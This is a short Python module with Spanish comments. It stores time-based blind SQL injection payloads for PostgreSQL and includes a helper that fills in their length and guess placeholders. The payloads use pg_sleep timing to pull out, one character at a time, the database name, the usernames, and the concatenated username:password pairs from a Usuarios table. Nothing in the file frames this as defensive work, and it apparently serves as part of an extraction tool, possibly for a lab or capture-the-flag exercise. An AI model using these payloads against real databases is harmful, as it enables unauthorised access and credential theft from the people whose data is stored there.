import textwrap

# {i} es la longitud de la palabra
# {p} es la palabra a comprobar
diccionario_inyecciones = {
    "nombres de usuario": "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) <> '{p}' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) = '{p}' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --",
    "nombres de la base de datos": """  '
  AND (
    left(current_database(), {i}) <> '{p}' 
    OR (
      left(current_database(), {i}) = '{p}' 
      AND EXISTS (SELECT 1 FROM pg_sleep(1))
    )
  )
--
""",
    "Usarios y Contraseñas concatenados": """ ' AND (
    LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), {i}) <> '{p}'
    OR (
      LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), {i}) = '{p}'
      AND EXISTS (SELECT 1 FROM pg_sleep(1))
    )
    )
    --""",
}


def transformar_inyeccion(inyeccion: str, palabra: str, longitud: int):
    inyeccion = inyeccion.replace("{i}", str(longitud))
    inyeccion = inyeccion.replace("{p}", palabra)
    # Eliminar la indentación
    inyeccion = textwrap.dedent(inyeccion)
    # Reemplazar saltos de línea y tabulaciones por espacios
    inyeccion = ' '.join(line.strip() for line in inyeccion.splitlines())

    return inyeccion


if __name__ == "__main__":
    print(transformar_inyeccion("nombres de usuario {i} {p}", "admin", 5))